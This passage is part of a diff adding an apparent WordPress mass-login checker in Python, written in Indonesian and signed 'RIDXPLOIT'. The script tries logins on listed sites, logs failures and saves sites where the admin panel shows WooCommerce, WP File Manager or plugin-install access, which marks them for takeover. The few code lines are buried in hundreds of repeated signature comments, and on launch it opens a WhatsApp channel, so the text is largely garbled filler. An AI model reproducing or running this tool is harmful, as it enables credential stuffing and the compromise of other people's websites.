+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+                if 'WooCommerce' in login.text:
+                    flags.append("WooCommerce")
+                    with open('WooCommerce.txt', 'a+', encoding='utf-8') as f:
+                        if new_entry not in f.read().splitlines():
+                            f.write(new_entry + '\n')
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+                if 'WP File Manager' in login.text:
+                    flags.append("FileManager")
+                    with open('wpfilemanager.txt', 'a+', encoding='utf-8') as f:
+                        if new_entry not in f.read().splitlines():
+                            f.write(new_entry + '\n')
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+                if 'plugin-install.php' in login.text:
+                    flags.append("PluginInstall")
+                    with open('plugin-install.txt', 'a+', encoding='utf-8') as f:
+                        if new_entry not in f.read().splitlines():
+                            f.write(new_entry + '\n')
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+                if flags:
+                    print(f"{C}- {' - '.join(flags)}{W}")
+            else:
+                print(f"{R}[×] {url_raw} --> LoginGagal{W}")
+                with open('LoginGagal.txt', 'a+', encoding='utf-8') as logf:
+                    if site not in logf.read().splitlines():
+                        logf.write(site + '\n')
+        else:
+            print(f"{Y}[!] {url_raw} --> BukanWordPress{W}")
+    except requests.exceptions.RequestException:
+        print(f"{R}[×] {site.split('|')[0]} --> Error koneksi{W}")
+    except Exception:
+        print(f"{R}[×] {site.split('|')[0]} --> Error tidak dikenal{W}")
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+if __name__ == '__main__':
+    webbrowser.open_new_tab('https://whatsapp.com/channel/0029VaudLHc7YSd9S9c9800c')
+    check_time_limit()
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
